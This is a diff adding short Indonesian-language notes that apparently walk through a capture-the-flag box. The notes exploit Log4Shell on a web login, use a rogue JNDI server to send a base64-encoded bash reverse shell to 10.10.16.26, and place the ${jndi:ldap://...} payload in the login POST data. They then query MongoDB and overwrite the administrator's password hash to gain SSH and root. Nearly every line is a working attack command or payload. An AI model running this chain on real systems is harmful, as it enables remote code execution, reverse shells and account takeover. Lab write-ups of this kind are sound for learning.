@@ -1,0 +1,21 @@
+1. scan nmap 22 kebuka ama lain2 banyak dah
+2. kesini dulu aja 8443 ada web login disitu
+3. cek versi -> cek exploit -> cve-2021-44228 -> leverage ke ldap
+4. intercept traffic pake tcpdump -> ldap default port 389
+5. java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc ipmu portmu -e /bin/sh" -A "ipmu" -> satunya nc ke port itu 
+6. ternyata gini jir ribet bat 
+7. echo 'bash -c bash -i >&/dev/tcp/10.10.16.26/6969 0>&1' | base64
+8. java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,taruh disini}|{base64,-d}|{bash,-i}" --hostname "10.10.16.26"
+9. terus masukin ini di post data pas login lewat burp 
+10. {"username":"asdf","password":"asdfas","remember":"${jndi:ldap://10.10.16.26:1389/o=tomcat}","strict":true}
+11. dah dapet shell nyalain aja nc buat di revshell tadi
+12. ps -aux | grep mongo -> dapet port nya
+13. mongo --port portnya -> show dbs -> use dbs -> db.namatabel.find() 
+14. dahlah baca wu aja sana
+15. mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+16.  mkpasswd -m sha-512 sidu [custom]
+17.  mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("id_admin")},{$set:{"x_shadow":"hash_hasilmu"}})'
+18. login di web nya pake creds administrator ama passwd buatanmu 
+19. ke setting ada creds 
+20. login ssh kesitu -> klaim root ama user flag   
